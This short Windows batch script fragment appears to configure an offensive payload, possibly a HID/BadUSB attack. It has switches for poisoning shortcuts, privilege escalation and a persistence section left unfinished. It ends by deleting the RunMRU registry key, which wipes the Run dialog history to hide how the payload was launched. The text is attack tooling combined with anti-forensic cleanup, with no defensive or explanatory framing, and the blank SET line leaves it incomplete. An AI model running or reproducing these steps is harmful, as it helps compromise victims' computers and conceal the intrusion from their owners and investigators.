REM Configuration Section, configure options here with yes/no

REM Shortcut Section:
SET poison_shortcuts=yes
SET shortcut_privesc=no

REM Privilege Escalation Section:
SET priv_esc_HID=no

REM Persistence Section:
SET 



REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
